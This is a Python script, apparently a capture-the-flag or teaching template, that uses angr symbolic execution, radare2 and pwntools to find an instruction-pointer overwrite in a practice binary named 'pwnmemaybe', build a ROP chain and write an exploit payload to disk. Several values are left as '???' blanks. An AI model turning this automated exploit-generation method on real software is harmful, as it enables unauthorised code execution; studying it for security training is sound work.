from pwn import *
import r2pipe
import angr
import sys
context.log_level='INFO'
context(arch='amd64', os='linux')

def fully_symbolic(state, variable):
    '''
    check if a symbolic variable is completely symbolic
    so we know if some register is now symbolic
    '''

    for i in range(state.arch.bits):
        if not state.solver.symbolic(variable[i]):
            return False

    return True


# In this case, we want to go to a function within the program which should not be called under normal conditions. 
# Therefore, we simply get the adress of that function in the intruction pointer
def build_ropchain():
    e = ELF("pwnmemaybe")
    write_target = e.bss()
    r = ROP([e])

    r.call(???, [0])

    # print(r.dump())
    return r


done = 0
while True:
    
    if done == 1:
        break

    # Step 1: Open with radare2 for automated analysis, find address of main function 

    r2 = r2pipe.open('./pwnmemaybe')
    r2.cmd('s ???')
    main_symbol_str = r2.cmd('is.')
    main_addr = int(main_symbol_str.splitlines()[-1].split()[2], 16)

    # Step2: Open with Angr, start simulation manager at address found by radare2
    project = angr.Project('./pwnmemaybe', selfmodifying_code=False, auto_load_libs=False)
    project.analyses.StaticHooker('libc.so.6')


    es = project.factory.entry_state(addr=main_addr)
    sm = project.factory.simulation_manager(es, save_unconstrained=True)

    extras = {angr.options.REVERSE_MEMORY_NAME_MAP, angr.options.TRACK_ACTION_HISTORY}
    es = project.factory.entry_state(add_options=extras)
    sm = project.factory.simulation_manager(es, save_unconstrained=True)

    # Step 3: have simulation manager step through the program until instruction pointer becomes symbolic
    # Which would mean Angr took over instruction pointer
    # sys.set_int_max_str_digits(10000)
    exploitable_state = None
    print("Starting exploration")
    while exploitable_state is None:
        sm.step()
        if len(sm.unconstrained) > 0:
            print("found some unconstrained states, checking exploitability")
            for u in sm.unconstrained:
                if fully_symbolic(u, u.regs.???):
                    exploitable_state = u
                    break

            # no exploitable state found, drop them
            sm.drop(stash='unconstrained')

    print("found a state which looks exploitable")
    ep = exploitable_state

    assert ep.solver.symbolic(ep.regs.???)
    print("success")

    # Step 4: Add additionnal constraint to make sure we can have some specific value written in instruction pointer
    ep.add_constraints(ep.regs.pc == ep.solver.BVV(bytes.fromhex("4142434445464748")))
    if ep.satisfiable():
        payload_template = ep.posix.dumps(0)
        padding = payload_template.split(b"\x48\x47\x46\x45\x44\x43\x42\x41")[0]

        # Step 5: Build ropchain, look at build_ropchain function
        r = build_ropchain()

        # Last step: Save crafted input data for successful exploitation on disk
        # Test exploitation with ./pwnmemaybe < payload
        payload = padding + r.chain()
        with open("payload", 'wb') as fd:
            fd.write(payload)


    done += 1
    print("Done:", done)
